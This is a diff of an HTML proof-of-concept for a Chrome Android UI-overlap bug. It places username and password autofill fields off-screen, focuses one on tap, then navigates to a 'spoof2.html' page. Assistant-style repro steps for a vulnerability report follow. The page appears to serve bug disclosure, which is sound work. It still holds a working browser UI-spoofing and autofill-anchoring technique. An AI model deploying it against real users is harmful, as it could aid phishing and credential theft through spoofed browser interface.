@@ -1,33 +1,185 @@
-
+```html
 <!DOCTYPE html>
-<html lang="en">
-    <head>
-        <title>Security UI Spoof</title>
-        <style>
-            body {
-                margin: 0;
-                padding: 0;
-            }         
-            #spoof {
-                width:  100%;
-                height: 100%;
-            }
-        </style>
-        <script>
-            onclick = async () => {
-             
-                setTimeout(function(){
-                alert();}, 1500);
-            }
-        </script>
-    </head>  
-    <body>
-        <a href="https://www.google.com">Click here!</a>
-        <div id="content">
-            <br><br><br>
-            <center>
-            </center>
-        </div>
-    </body>
-  </body>
+<html>
+<head>
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, user-scalable=no">
+
+  <title>Chrome Bottom Address-Bar UI Overlap PoC</title>
+
+  <style>
+    html,
+    body {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      overflow: hidden;
+    }
+
+    /*
+     * The autofill target field is positioned ABOVE the viewport.
+     *
+     * element.BoundsInWidget() can return a negative y coordinate,
+     * which is propagated to the autofill pipeline. The Android
+     * credential picker (FillUi) can then calculate an anchor outside
+     * the WebView's visible bounds.
+     *
+     * Adjust "top" to target a specific browser/embedder UI region.
+     */
+    #u {
+      position: fixed;
+      top: -120px;
+      left: 0;
+      width: 300px;
+      height: 40px;
+      font-size: 16px;
+    }
+
+    #p {
+      position: fixed;
+      top: -200px;
+      left: 0;
+      width: 300px;
+      height: 40px;
+    }
+
+    /*
+     * Single user-activation surface.
+     */
+    #tap {
+      position: fixed;
+      top: 40px;
+      left: 20px;
+      right: 20px;
+      padding: 18px;
+      background: #1a73e8;
+      color: #fff;
+      font: 18px sans-serif;
+      text-align: center;
+      border-radius: 6px;
+      box-sizing: border-box;
+      user-select: none;
+      -webkit-user-select: none;
+    }
+
+    #log {
+      position: fixed;
+      top: 120px;
+      left: 20px;
+      right: 20px;
+      font: 12px monospace;
+      white-space: pre-wrap;
+    }
+  </style>
+</head>
+
+<body>
+
+  <form action="c/login" method="post" id="f">
+    <input
+      id="u"
+      name="username"
+      type="text"
+      autocomplete="username">
+
+    <input
+      id="p"
+      name="password"
+      type="password"
+      autocomplete="current-password">
+  </form>
+
+  <!--
+    Single-tap reproduction trigger.
+  -->
+  <div id="tap">Tap once to reproduce</div>
+
+  <pre id="log"></pre>
+
+  <script>
+    const log = message => {
+      document.getElementById('log').textContent += message + '\n';
+    };
+
+    const tap = document.getElementById('tap');
+    const username = document.getElementById('u');
+
+    let triggered = false;
+
+    tap.addEventListener('click', () => {
+      if (triggered) {
+        return;
+      }
+
+      triggered = true;
+
+      log('Starting reproduction...');
+
+      /*
+       * Focus the off-viewport autofill field without scrolling it
+       * into the visible viewport.
+       *
+       * The renderer can send autofill.mojom.AutofillDriver
+       * information containing a FormFieldData bounds.y < 0,
+       * originating from element.BoundsInWidget().
+       */
+      username.focus({ preventScroll: true });
+
+      const rect = username.getBoundingClientRect();
+
+      log(
+        'focused #u, viewport bounds y=' +
+        rect.top +
+        ' h=' +
+        rect.height
+      );
+
+      log(
+        'expected: autofill UI is anchored relative to an ' +
+        'off-viewport field'
+      );
+
+      log('Waiting for browser UI to settle...');
+
+      /*
+       * Preserve the delay from the original PoC.
+       *
+       * This gives Chrome time to update/reposition its browser UI
+       * before navigating to the next page.
+       */
+      setTimeout(() => {
+        log('Navigating to spoof2.html...');
+
+        document.location = 'spoof2.html';
+      }, 6000);
+    });
+
+    /*
+     * Variant:
+     *
+     * To test an element positioned BELOW the WebView instead,
+     * uncomment the following line.
+     *
+     * This can be used to investigate overlap with a bottom
+     * embedder/browser UI region.
+     *
+     * username.style.top = (window.innerHeight + 80) + 'px';
+     */
+  </script>
+
+</body>
 </html>
+```
+
+### New repro steps
+
+You can now make the report:
+
+1. Open Chrome in **landscape mode** with the address bar at the bottom.
+2. Open the PoC.
+3. Tap **"Tap once to reproduce"**.
+4. Wait ~6 seconds.
+
+**Observe:** web content can overlap the area occupied by Chrome's bottom address bar.
+
+One caveat: this is the correct **one-tap simplification to test**, but if the original issue specifically requires the subsequent double-tap to trigger a Chrome UI transition, this version may not reproduce it. If it doesn't, the next step should be to identify exactly what the second/double tap changes rather than artificially simulating taps.
